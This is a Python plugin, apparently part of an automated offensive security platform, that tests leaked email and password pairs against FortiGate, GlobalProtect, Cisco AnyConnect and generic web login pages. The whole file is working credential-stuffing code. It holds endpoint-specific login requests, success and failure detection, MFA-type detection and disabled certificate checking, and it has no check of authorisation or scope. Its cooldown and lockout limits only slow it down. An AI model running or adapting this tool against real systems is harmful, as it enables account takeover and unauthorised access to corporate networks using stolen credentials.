"""
Credential Test Tool (Leaked Credentials)
Tests leaked credentials against web logins and VPN portals with strict
safety controls: single attempt, cooldown, account-lock detection, rate limits.
"""

import asyncio
import aiohttp
import json
import re
import ssl
import time
from typing import Dict, Any, List, Optional
from plugin_interface import ToolPlugin


# Maximum credentials per batch
MAX_BATCH_SIZE = 20

# Cooldown between credential attempts (seconds)
ATTEMPT_COOLDOWN = 30

# Result constants
RESULT_VALID = 'VALID'
RESULT_INVALID = 'INVALID'
RESULT_MFA_REQUIRED = 'MFA_REQUIRED'
RESULT_ACCOUNT_LOCKED = 'ACCOUNT_LOCKED'
RESULT_ERROR = 'ERROR'

# MFA indicator patterns
MFA_PATTERNS = [
    r'two.?factor', r'2fa', r'mfa', r'totp', r'one.?time',
    r'verification\s+code', r'authenticator', r'sms\s+code',
    r'push\s+notification', r'security\s+code', r'second\s+factor',
    r'duo', r'okta.*verify', r'enter.*code',
]

# Account lock patterns
LOCK_PATTERNS = [
    r'account.*lock', r'locked.*out', r'too\s+many\s+attempts',
    r'temporarily.*disabled', r'account.*disabled', r'suspended',
    r'blocked', r'exceeded.*attempts', r'try\s+again\s+later',
]


class CredentialTestLeakedTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "credential:test_leaked"

    @property
    def description(self) -> str:
        return "Test leaked credentials against web logins and VPN portals with strict safety controls (single attempt, cooldown, account-lock detection)"

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "credentials": {
                    "type": "array",
                    "x-widget": "json-editor",
                    "items": {
                        "type": "object",
                        "properties": {
                            "email": {"type": "string"},
                            "password": {"type": "string"},
                        },
                        "required": ["email", "password"]
                    },
                    "description": "List of credential pairs to test (max 20 per batch)",
                    "maxItems": 20
                },
                "targetUrl": {
                    "type": "string",
                    "description": "Target URL for the login portal"
                },
                "serviceType": {
                    "type": "string",
                    "enum": ["web_login", "fortigate", "globalprotect", "prisma_access", "cisco_anyconnect", "generic"],
                    "description": "Type of login service (determines login strategy)"
                },
                "timeout": {
                    "type": "integer",
                    "description": "Request timeout in seconds (default: 30)"
                },
            },
            "required": ["credentials", "targetUrl", "serviceType"]
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit",
            "phase": 5,
            "domain": ["infra", "web"],
            "input_type": ["url"],
            "output_type": ["findings"],
            "chainable_after": ["vpn:detect_portal", "darkweb:monitor"],
            "chainable_before": [],
        }

    async def execute(self, parameters: Dict[str, Any]) -> Any:
        agent = parameters.get('_agent')
        credentials = parameters.get('credentials', [])
        target_url = parameters.get('targetUrl', '').strip()
        service_type = parameters.get('serviceType', 'generic')
        timeout_sec = parameters.get('timeout', 30)

        if isinstance(credentials, str):
            credentials = json.loads(credentials)

        # Enforce batch size limit
        if len(credentials) > MAX_BATCH_SIZE:
            credentials = credentials[:MAX_BATCH_SIZE]
            if agent:
                agent.report_progress(f"Batch size capped to {MAX_BATCH_SIZE} credentials")

        start_time = time.time()
        results = []
        locked_detected = False

        if agent:
            agent.report_progress(
                current_operation=f"Testing {len(credentials)} credentials against {service_type} at {target_url}",
                current_target=target_url,
                items_processed=0,
                total_items=len(credentials),
            )

        # SSL context (VPN portals may use self-signed certs)
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

        connector = aiohttp.TCPConnector(ssl=ssl_ctx)
        client_timeout = aiohttp.ClientTimeout(total=timeout_sec)

        async with aiohttp.ClientSession(connector=connector, timeout=client_timeout) as session:
            for i, cred in enumerate(credentials):
                if locked_detected:
                    results.append({
                        'email': cred['email'],
                        'result': RESULT_ERROR,
                        'details': 'Skipped: account lockout detected on previous attempt',
                    })
                    continue

                email = cred['email']
                password = cred['password']

                if agent:
                    agent.report_progress(
                        current_operation=f"Testing credential {i+1}/{len(credentials)}: {email}",
                        current_target=target_url,
                        items_processed=i,
                        total_items=len(credentials),
                    )

                try:
                    result = await self._test_credential(
                        session, target_url, email, password, service_type
                    )
                    results.append(result)

                    # Check for account lockout - auto-stop
                    if result['result'] == RESULT_ACCOUNT_LOCKED:
                        locked_detected = True
                        if agent:
                            agent.report_progress(f"ACCOUNT LOCKED detected for {email} - stopping all tests")

                except Exception as e:
                    results.append({
                        'email': email,
                        'result': RESULT_ERROR,
                        'details': str(e),
                    })

                # Cooldown between attempts (skip after last one)
                if i < len(credentials) - 1 and not locked_detected:
                    if agent:
                        agent.report_progress(f"Cooldown: waiting {ATTEMPT_COOLDOWN}s before next attempt")
                    await asyncio.sleep(ATTEMPT_COOLDOWN)

        elapsed = time.time() - start_time

        # Summarize results
        summary = {
            'total': len(results),
            'valid': sum(1 for r in results if r['result'] == RESULT_VALID),
            'invalid': sum(1 for r in results if r['result'] == RESULT_INVALID),
            'mfa_required': sum(1 for r in results if r['result'] == RESULT_MFA_REQUIRED),
            'locked': sum(1 for r in results if r['result'] == RESULT_ACCOUNT_LOCKED),
            'errors': sum(1 for r in results if r['result'] == RESULT_ERROR),
            'locked_detected': locked_detected,
        }

        output = {
            'targetUrl': target_url,
            'serviceType': service_type,
            'results': results,
            'summary': summary,
            'tool': 'credential_test',
            'scan_type': 'test_leaked',
        }

        raw_output = json.dumps(output, indent=2, default=str)

        if agent:
            agent.report_progress(
                current_operation=f"Credential test complete: {summary['valid']} valid, {summary['invalid']} invalid, {summary['mfa_required']} MFA, {summary['locked']} locked",
                current_target=target_url,
                items_processed=len(credentials),
                total_items=len(credentials),
            )
            agent.append_output(raw_output)

        return {
            'success': True,
            'output': output,
            'raw_output': raw_output,
            'execution_metrics': {
                'duration_seconds': round(elapsed, 2),
                'credentials_tested': len(results),
            }
        }

    async def _test_credential(self, session: aiohttp.ClientSession, target_url: str, email: str, password: str, service_type: str) -> Dict[str, Any]:
        """Test a single credential against the target. Single attempt only."""
        handlers = {
            'fortigate': self._test_fortigate,
            'globalprotect': self._test_globalprotect,
            'cisco_anyconnect': self._test_cisco_anyconnect,
            'web_login': self._test_web_login,
            'prisma_access': self._test_globalprotect,  # Same login flow
            'generic': self._test_web_login,
        }
        handler = handlers.get(service_type, self._test_web_login)
        return await handler(session, target_url, email, password)

    async def _test_fortigate(self, session: aiohttp.ClientSession, target_url: str, email: str, password: str) -> Dict[str, Any]:
        """FortiGate: POST /remote/logincheck with username + credential fields."""
        base = target_url.rstrip('/')
        url = f"{base}/remote/logincheck"

        try:
            data = aiohttp.FormData()
            data.add_field('ajax', '1')
            data.add_field('username', email)
            data.add_field('credential', password)

            async with session.post(url, data=data, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
                status = resp.status

                if self._check_lockout(body):
                    return {'email': email, 'result': RESULT_ACCOUNT_LOCKED, 'details': 'Account lockout detected in response'}

                if self._check_mfa(body):
                    mfa_type = self._detect_mfa_type(body)
                    return {'email': email, 'result': RESULT_MFA_REQUIRED, 'details': 'MFA challenge presented', 'mfaType': mfa_type}

                # FortiGate success: response contains 'redir' or redirect to /remote/
                if 'redir' in body or (status in (301, 302) and '/remote/' in resp.headers.get('Location', '')):
                    return {'email': email, 'result': RESULT_VALID, 'details': 'Login redirect detected (redir in response)'}

                # FortiGate failure: ret=0 or ret=1 with error
                if 'ret=0' in body or status == 401:
                    return {'email': email, 'result': RESULT_INVALID, 'details': 'Login failed (ret=0 or 401)'}

                return {'email': email, 'result': RESULT_INVALID, 'details': f'Login failed (status {status})'}

        except Exception as e:
            return {'email': email, 'result': RESULT_ERROR, 'details': str(e)}

    async def _test_globalprotect(self, session: aiohttp.ClientSession, target_url: str, email: str, password: str) -> Dict[str, Any]:
        """GlobalProtect/Prisma: POST /ssl-vpn/login.esp with user + passwd."""
        base = target_url.rstrip('/')
        url = f"{base}/ssl-vpn/login.esp"

        try:
            data = aiohttp.FormData()
            data.add_field('prot', 'https:')
            data.add_field('server', base.split('//')[1] if '//' in base else base)
            data.add_field('inputStr', '')
            data.add_field('user', email)
            data.add_field('passwd', password)

            async with session.post(url, data=data, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')

                if self._check_lockout(body):
                    return {'email': email, 'result': RESULT_ACCOUNT_LOCKED, 'details': 'Account lockout detected'}

                if self._check_mfa(body):
                    mfa_type = self._detect_mfa_type(body)
                    return {'email': email, 'result': RESULT_MFA_REQUIRED, 'details': 'MFA challenge presented', 'mfaType': mfa_type}

                # GlobalProtect success
                if '<status>success</status>' in body.lower() or 'portal-prelogin' in body.lower():
                    return {'email': email, 'result': RESULT_VALID, 'details': 'Login success (status=success in XML response)'}

                # GlobalProtect failure
                if '<msg>invalid' in body.lower() or 'authentication failed' in body.lower():
                    return {'email': email, 'result': RESULT_INVALID, 'details': 'Login failed (invalid credentials in response)'}

                return {'email': email, 'result': RESULT_INVALID, 'details': f'Login failed (status {resp.status})'}

        except Exception as e:
            return {'email': email, 'result': RESULT_ERROR, 'details': str(e)}

    async def _test_cisco_anyconnect(self, session: aiohttp.ClientSession, target_url: str, email: str, password: str) -> Dict[str, Any]:
        """Cisco AnyConnect: POST to /+CSCOE+/logon.html."""
        base = target_url.rstrip('/')
        url = f"{base}/+CSCOE+/logon.html"

        try:
            data = aiohttp.FormData()
            data.add_field('username', email)
            data.add_field('password', password)
            data.add_field('group_list', '')
            data.add_field('tgroup', '')

            async with session.post(url, data=data, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')

                if self._check_lockout(body):
                    return {'email': email, 'result': RESULT_ACCOUNT_LOCKED, 'details': 'Account lockout detected'}

                if self._check_mfa(body):
                    mfa_type = self._detect_mfa_type(body)
                    return {'email': email, 'result': RESULT_MFA_REQUIRED, 'details': 'MFA challenge presented', 'mfaType': mfa_type}

                # Cisco success: redirect to portal or session cookie set
                location = resp.headers.get('Location', '')
                if resp.status in (301, 302) and ('/+CSCOE+/' not in location or 'portal' in location.lower()):
                    return {'email': email, 'result': RESULT_VALID, 'details': 'Login redirect to portal detected'}

                if 'webvpn_logout' in body or '/+CSCOE+/session' in body:
                    return {'email': email, 'result': RESULT_VALID, 'details': 'Session established (logout/session link found)'}

                if 'login failed' in body.lower() or 'invalid' in body.lower() or resp.status == 401:
                    return {'email': email, 'result': RESULT_INVALID, 'details': 'Login failed'}

                return {'email': email, 'result': RESULT_INVALID, 'details': f'Login failed (status {resp.status})'}

        except Exception as e:
            return {'email': email, 'result': RESULT_ERROR, 'details': str(e)}

    async def _test_web_login(self, session: aiohttp.ClientSession, target_url: str, email: str, password: str) -> Dict[str, Any]:
        """Generic web login: GET the page, find the login form, POST credentials."""
        try:
            # Step 1: GET the login page to find the form
            async with session.get(target_url, allow_redirects=True) as resp:
                body = await resp.text(errors='replace')
                page_url = str(resp.url)

            # Find form action
            form_match = re.search(
                r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', body, re.IGNORECASE
            )
            form_action = form_match.group(1) if form_match else target_url

            # Resolve relative URLs
            if form_action and not form_action.startswith('http'):
                if form_action.startswith('/'):
                    # Extract base URL
                    from urllib.parse import urlparse
                    parsed = urlparse(page_url)
                    form_action = f"{parsed.scheme}://{parsed.netloc}{form_action}"
                else:
                    form_action = f"{page_url.rstrip('/')}/{form_action}"

            # Find input field names for username/password
            username_field = self._find_input_name(body, ['email', 'username', 'user', 'login', 'uid', 'name'])
            password_field = self._find_input_name(body, ['password', 'passwd', 'pass', 'pwd', 'credential'])

            if not username_field:
                username_field = 'username'
            if not password_field:
                password_field = 'password'

            # Find hidden fields (CSRF tokens, etc.)
            hidden_fields = {}
            for match in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', body, re.IGNORECASE):
                tag = match.group(0)
                name_match = re.search(r'name=["\']([^"\']+)["\']', tag)
                value_match = re.search(r'value=["\']([^"\']*)["\']', tag)
                if name_match:
                    hidden_fields[name_match.group(1)] = value_match.group(1) if value_match else ''

            # Step 2: POST the credentials
            form_data = {**hidden_fields, username_field: email, password_field: password}

            async with session.post(form_action, data=form_data, allow_redirects=True) as resp:
                body = await resp.text(errors='replace')
                final_url = str(resp.url)

                if self._check_lockout(body):
                    return {'email': email, 'result': RESULT_ACCOUNT_LOCKED, 'details': 'Account lockout detected'}

                if self._check_mfa(body):
                    mfa_type = self._detect_mfa_type(body)
                    return {'email': email, 'result': RESULT_MFA_REQUIRED, 'details': 'MFA challenge presented after login', 'mfaType': mfa_type}

                # Check for success indicators
                success_indicators = [
                    'dashboard', 'welcome', 'my.?account', 'profile', 'logout', 'sign.?out',
                ]
                failure_indicators = [
                    'invalid.*password', 'incorrect.*credentials', 'login.*failed',
                    'authentication.*failed', 'wrong.*password', 'bad.*credentials',
                    'invalid.*username', 'error.*login',
                ]

                body_lower = body.lower()

                for pattern in failure_indicators:
                    if re.search(pattern, body_lower):
                        return {'email': email, 'result': RESULT_INVALID, 'details': f'Login failed (matched: {pattern})'}

                # If we got redirected away from login page, might be success
                if final_url != page_url and final_url != form_action:
                    for pattern in success_indicators:
                        if re.search(pattern, body_lower) or re.search(pattern, final_url.lower()):
                            return {'email': email, 'result': RESULT_VALID, 'details': f'Login appears successful (redirected to {final_url})'}

                # If still on login page, probably failed
                if 'login' in final_url.lower() or 'logon' in final_url.lower():
                    return {'email': email, 'result': RESULT_INVALID, 'details': 'Still on login page after submission'}

                return {'email': email, 'result': RESULT_INVALID, 'details': f'Login result unclear (status {resp.status}, url: {final_url})'}

        except Exception as e:
            return {'email': email, 'result': RESULT_ERROR, 'details': str(e)}

    def _find_input_name(self, html: str, candidates: List[str]) -> Optional[str]:
        """Find the name attribute of an input field matching candidate names."""
        inputs = re.findall(r'<input[^>]*>', html, re.IGNORECASE)
        for inp in inputs:
            name_match = re.search(r'name=["\']([^"\']+)["\']', inp, re.IGNORECASE)
            if name_match:
                name = name_match.group(1)
                for candidate in candidates:
                    if candidate in name.lower():
                        return name
        return None

    def _check_mfa(self, body: str) -> bool:
        """Check if response body contains MFA/2FA challenge indicators."""
        body_lower = body.lower()
        return any(re.search(p, body_lower) for p in MFA_PATTERNS)

    def _check_lockout(self, body: str) -> bool:
        """Check if response body indicates account lockout."""
        body_lower = body.lower()
        return any(re.search(p, body_lower) for p in LOCK_PATTERNS)

    def _detect_mfa_type(self, body: str) -> str:
        """Try to determine the type of MFA challenge."""
        body_lower = body.lower()
        if re.search(r'totp|authenticator|google.*auth', body_lower):
            return 'TOTP'
        if re.search(r'push|duo|approve', body_lower):
            return 'PUSH'
        if re.search(r'sms|text\s+message|phone', body_lower):
            return 'SMS'
        if re.search(r'email.*code|verification.*email', body_lower):
            return 'EMAIL'
        if re.search(r'fido|webauthn|security\s+key|yubikey', body_lower):
            return 'FIDO2'
        return 'UNKNOWN'


def get_tool():
    return CredentialTestLeakedTool()
